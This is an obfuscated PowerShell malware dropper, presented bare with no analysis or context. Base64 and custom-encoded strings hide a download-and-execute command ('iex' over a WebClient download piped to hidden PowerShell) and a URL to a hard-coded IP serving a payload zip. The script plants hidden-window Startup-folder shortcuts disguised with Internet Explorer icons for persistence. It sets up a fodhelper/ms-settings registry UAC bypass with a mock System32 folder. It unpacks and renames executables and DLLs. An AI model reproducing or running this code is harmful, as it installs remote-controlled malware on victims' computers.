${first_1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBtAGQA')))
${second_2} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQB4AGUA')))
${__///\\\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBwAG4AZwA=')))
${fourth_4} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('egBpAHAA')))
${fifth_5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwA1ADEALgAzADgALgAyADMANQAuADEANQAyAC8AMgAwAC8AYQAvAG0ALwBtAC4AegBpAHAA')))
${_/|\_/|/\\\\\\\/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB1AGIAbABpAGMA'))) 
${_/|_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwA6AFwAdQBzAGUAcgBzAFwA'))) 
${eight_8} = "${_/|_}${_/|\_/|/\\\\\\\/|_}"
${_\\/\/\/\/\/\/\/\////\\\//\/\/\/\//_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwA')))
${_\\/\/\/\/\/\/\/\////\\\//\/\/\/\////_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBhAGwAbAA='))) 
${_\\/\/\/\/\/\/\/\////\\\//\/\/\/\////\\\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBUAFIAVQBDAFQA')))
${_\\/\/\/\/\/\/\/\////\\\//\/\/\/\///////\\\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SgBMAEkAXwBHAGUAdABTAHQAZABBAHIAZwBjAA=='))) 
${_\\/\/\//\/\\/\/\/\/\////\\\//\/\/\/\///////\\\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwATwBwAGUAbgA=')))
${_\\/\/\//\/\\/\/\/\/\\\\\////\\\//\/\/\/\///////\\\_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IwBOAG8AVAByAGEAeQBJAGMAbwBuAA==')))
${_um_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAQwBsAGEAcwBzAGUAcwBcAG0AcwAtAHMAZQB0AHQAaQBuAGcAcwBcAFMAaABlAGwAbABcAE8AcABlAG4AXABjAG8AbQBtAGEAbgBkAA=='))) 
${_dois_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwAQwBsAGEAcwBzAGUAcwBcAG0AcwAtAHMAZQB0AHQAaQBuAGcAcwBcAFMAaABlAGwAbABcAE8AcABlAG4AXABjAG8AbQBtAGEAbgBkACIAIAAtAE4AYQBtAGUAIAAiAEQAZQBsAGUAZwBhAHQAZQBFAHgAZQBjAHUAdABlACIAIAAtAFYAYQBsAHUAZQAgACIA')))
${_tres_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQBnAGEAdABlAEUAeABlAGMAdQB0AGUA'))) 
${_qtro_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGUAZgBhAHUAbAB0ACkA')))
${_fiv_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGYAbwBkAGgAZQBsAHAAZQByAC4AZQB4AGUA')))
${_six_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgBvAGQAaABlAGwAcABlAHIALgBlAHgAZQA=')))
${_sev_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcAD8AXABDADoAXABXAGkAbgBkAG8AdwBzACAAXABTAHkAcwB0AGUAbQAzADIAXAA=')))
${_\\\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQBuACAAaQBhAA=='))) 
${sixteenth_16} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwA6AFwA')))
${_tx_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgB0AHgAdAA=')))
${_dx_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBkAGwAbAA=')))
${_ex_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LgBlAHgAZQA=')))
${_jl_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('agBsAGkA')))
${_ms_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBTAFYAQwBSADEAMAAwAA==')))
${_wb_} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBlAGIAVgBpAGUAdwAyAEwAbwBhAGQAZQByAA==')))
${var1} = $env:COMPUTERNAME
${var2} = "060523"

#### Funcion numero uno


Function Func1 {
$var3 = "q","w","e","r","t","y","u","p","a","s","d","f","g","h","j","k","z","x","c","v","b","n","m"
$var4 = "2_","3_","4_","5_","6_","7_","8_","9_"
$var5 = $null
$var6 = Get-Random -InputObject $var3 -Count 6
$var7 = Get-Random -InputObject $var4 -Count 1
$var8 = Get-Random -InputObject $var3.ToUpper() -Count 1
foreach($n in $var6) {
$var5 += $n
}
foreach ($n2 in $var7) {
$var5 += $n2
}
foreach ($n3 in $var8) {
$var5 += $n3
}
return "_$var5"
}


${var9} = Func1
${GER} = ${var9}
${mal} = "@14@12@17@24 @18@14@33 (@23@14@32-@24@11@19@14@12@29 @23@14@29.@32@14@11@12@21@18@14@23@29).@13@24@32@23@21@24@10@13@28@29@27@18@23@16('@17@29@29@25@28://@22@10@18@24@2@3.@12@24@22/@10/@0@8/@1@5@0@8@2@2/@30@25/@30@25')  | @25@24@32@14@27@28@17@14@21@21.@14@33@14 -@23@24@25 -@32@18@23 @1 -"
${var11} = "${eight_8}\${var2}"
   if ((${var11} | Test-Path)) {exit}
    New-Item -ItemType directory -Path "${sixteenth_16}${var9}"
    ${var10} = "${sixteenth_16}${var9}\${var1}"
    ${var11}  =  ${mal}
    ${var11} | Set-Content ${var10}${GER}
    ${var12} = (${var9})
    ${var13} = (${var9} + "A")
    ${var14} = (${var9} + "B") 	
    ${var15} = "${eight_8}\${var1}${GER}.${first_1}"
    ${var16}  =  "@Echo off`r`n"
	${var16}  += "Setlocal EnableExtensions`r`n"
    ${var16}  += "Setlocal EnableDelayedExpansion`r`n"
    ${var16}  += "cd %SystemRoot%\System32`r`n"
    ${var16}  += "Set /P ${var9}=<`"${var10}${GER}`"`r`n"
	${var16}  += "set chars=0123456789abcdefghijklmnopqrstuvwxyz`r`n"
	${var16}  += "for /L %%N in (10 1 36) do (`r`n"
	${var16}  += "for /F %%C in (`"!chars:~%%N,1!`") do (`r`n"
	${var16}  += "set `"${var9}=!${var9}:%%N=%%C!`"`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += "for /F %%F in (`"!${var9}!`") do (`r`n"
    ${var16}  += "set `"${var9}=!${var9}:@=!`"`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += "for /F %%F in (`"!${var9}!`") do (`r`n"
    ${var16}  += "set `"${var9}=!${var9}:`"=!`"`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += "%${var9}%`r`n"
    ${var16} | Set-Content ${var15}


 #### Funcion 2    
function Func2
{
  Param([string]${var17},[string]${var18});
  try{  
    ${var19} = New-Object -ComObject WScript.Shell 
    ${var20} = ${var19}.CreateShortcut(${var17}) 
    ${var20}.TargetPath = "${sixteenth_16}${var9}\${var9}.${second_2}"     
    ${var20}.Arguments = "${sixteenth_16}${var9}\${var9}.ai"  
    ${var20}.WorkingDirectory = "${sixteenth_16}${var9}\" 
    ${var20}.WindowStyle = 7   
    ${var20}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${var20}.Save()
  }finally{}
}
function Func3
{
  Param([string]${var17},[string]${var18});
  try{  
    ${var19} = New-Object -ComObject WScript.Shell 
    ${var20} = ${var19}.CreateShortcut(${var17}) 
    ${var20}.TargetPath = "${sixteenth_16}${var9}\${var9}.${second_2}"     
    ${var20}.Arguments = "${sixteenth_16}${var9}\${var9}.at"  
    ${var20}.WorkingDirectory = "${sixteenth_16}${var9}\" 
    ${var20}.WindowStyle = 7   
    ${var20}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${var20}.Save()
  }finally{}
}
${TESTE} = "${_sev_}"
New-Item ${TESTE} -ItemType Directory
Copy-Item -Path "${_fiv_}" -Destination "${TESTE}${_six_}" -Recurse
function Func4
{
  Param([string]${var17},[string]${var18});
  try{  
    ${var19} = New-Object -ComObject WScript.Shell 
    ${var20} = ${var19}.CreateShortcut(${var17}) 
    ${var20}.TargetPath = "${sixteenth_16}${var9}\${var9}i7${_ex_}"     
    ${var20}.Arguments = ""  
    ${var20}.WorkingDirectory = "${sixteenth_16}" 
    ${var20}.WindowStyle = 7   
    ${var20}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${var20}.Save()
  }finally{}
}


function Func5
{
  Param([string]${var17},[string]${var18});
  try{  
    ${var19} = New-Object -ComObject WScript.Shell 
    ${var20} = ${var19}.CreateShortcut(${var17}) 
    ${var20}.TargetPath = "${var15}"       
    ${var20}.Arguments = ""
    ${var20}.WorkingDirectory = "" 
    ${var20}.WindowStyle = 7   
    ${var20}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${var20}.Save()
  }finally{}
}


${var21} = New-Object -Com WScript.Shell
${var22} = ${var21}.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          




${var23} = "                                                                                                                                                                                                                                                                                                  $env:APPDATA\${var24}, ${var25}"
${var26} = "${var22}\${var9}.lnk"        
Func5 ${var26}  ${var23} 
${var26} = "${var22}\${var9}EX.lnk" 
Func2 ${var26}  ${var23} 

${var26} = "${var22}\${var9}AT.lnk" 
Func3 ${var26}  ${var23} 

${var26} = "${var22}\${var9}AA.lnk" 
Func4 ${var26}  ${var23} 

   ${mal} = "@14@12@17@24 @18@14@33 (@23@14@32-@24@11@19@14@12@29 @23@14@29.@32@14@11@12@21@18@14@23@29).@13@24@32@23@21@24@10@13@28@29@27@18@23@16('@17@29@29@25@28://@22@10@18@24@2@3.@12@24@22/@10/@0@8/@1@5@0@8@2@2/@10@30/@10@30')  | @25@24@32@14@27@28@17@14@21@21.@14@33@14 -@23@24@25 -@32@18@23 @1 -"

    ${var9} = ${var9}
    ${var10} = "${sixteenth_16}${var9}\${var1}"
    ${var11}  =  ${mal}
    ${var11} | Set-Content ${var10}${GER}y
    ${var12} = (${var9})
    ${var13} = (${var9} + "A")
    ${var14} = (${var9} + "B") 
    ${var15} = "${eight_8}\${var1}${GER}y.${first_1}"
    ${var16}  =  "@Echo off`r`n"
	${var16}  += "Setlocal EnableExtensions`r`n"
    ${var16}  += "Setlocal EnableDelayedExpansion`r`n"
    ${var16}  += "cd %SystemRoot%\System32`r`n"
    ${var16}  += "Set /P ${var9}=<`"${var10}${GER}y`"`r`n"
    ${var16}  += "set chars=0123456789abcdefghijklmnopqrstuvwxyz`r`n"
    ${var16}  += "for /L %%N in (10 1 36) do (`r`n"
    ${var16}  += "for /F %%C in (`"!chars:~%%N,1!`") do (`r`n"
    ${var16}  += "set `"${var9}=!${var9}:%%N=%%C!`"`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += "for /F %%F in (`"!${var9}!`") do (`r`n"
    ${var16}  += "set `"${var9}=!${var9}:@=!`"`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += "for /F %%F in (`"!${var9}!`") do (`r`n"
    ${var16}  += "set `"${var9}=!${var9}:`"=!`"`r`n"
    ${var16}  += ")`r`n"
    ${var16}  += "%${var9}%`r`n"
    ${var16} | Set-Content ${var15}
	
function Func6
{
  Param([string]${var17},[string]${var18});
  try{  
    ${var19} = New-Object -ComObject WScript.Shell 
    ${var20} = ${var19}.CreateShortcut(${var17}) 
    ${var20}.TargetPath = "${var15}"       
    ${var20}.Arguments = ""
    ${var20}.WorkingDirectory = "" 
    ${var20}.WindowStyle = 7   
    ${var20}.IconLocation = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JQBQAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwAlAFwASQBuAHQAZQByAG4AZQB0ACAARQB4AHAAbABvAHIAZQByAFwAaQBlAHgAcABsAG8AcgBlAC4AZQB4AGUALAAxAA==')))
    ${var20}.Save()
  }finally{}
}
${var21} = New-Object -Com WScript.Shell
${var22} = ${var21}.SpecialFolders.Item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB0AGEAcgB0AHUAcAA='))));          
${var23} = "                                                                                                                                                                                                                                                                                                  $env:APPDATA\${var24}, ${var25}"
${var26} = "${var22}\${var9}y.lnk"        
Func6 ${var26}  ${var23}
${var27} = ${var9}
${var27} | Set-Content "${eight_8}\${var2}"
${var27} | Out-File "${eight_8}\${var2}"
${var27} > "${eight_8}\${var2}"
${var28} = new-object System.Net.WebClient
${var28}.DownloadFile(${fifth_5},"${sixteenth_16}${var9}\${var9}.${var9}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}.zip") -Path ("${sixteenth_16}${var9}\${var9}.${var9}")
Expand-Archive -Path "${sixteenth_16}${var9}\${var9}.${fourth_4}" -DestinationPath "${sixteenth_16}${var9}"
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}.${second_2}") -Path ("${sixteenth_16}${var9}\${second_2}${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}.ia") -Path ("${sixteenth_16}${var9}\6${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}.ai") -Path ("${sixteenth_16}${var9}\b${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}.at") -Path ("${sixteenth_16}${var9}\c${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}.mdat") -Path ("${sixteenth_16}${var9}\at${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${var9}i7${_ex_}") -Path ("${sixteenth_16}${var9}\i7${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${_jl_}${_dx_}") -Path ("${sixteenth_16}${var9}\${_jl_}${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${_ms_}${_dx_}") -Path ("${sixteenth_16}${var9}\${_ms_}${_tx_}")
Rename-Item -NewName ("${sixteenth_16}${var9}\${_wb_}${_dx_}") -Path ("${sixteenth_16}${var9}\${_wb_}${_tx_}")

# Create reg structure
New-Item "${_um_}" -Force
New-ItemProperty -Path "${_um_}" -Name "${_tres_}" -Value "" -Force
# Place command in
Set-ItemProperty -Path "${_um_}" -Name "${_qtro_}" -Value "${sixteenth_16}${var9}\${var9}i7${_ex_}" -Force  
